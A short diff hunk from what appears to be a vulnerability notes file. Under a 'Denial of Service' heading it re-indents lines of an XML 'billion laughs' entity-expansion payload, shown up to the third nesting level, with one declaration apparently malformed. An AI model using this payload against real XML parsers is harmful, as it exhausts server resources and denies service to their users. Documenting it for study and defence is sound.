@@ -116,8 +116,8 @@ This is Vulnerability
 
 ## Denial of Service 
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE lolz [<!ENTITY lol "lol><!ELEMENT lolz (#PCDATA)>
+     <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE lolz [<!ENTITY lol "lol><!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2">
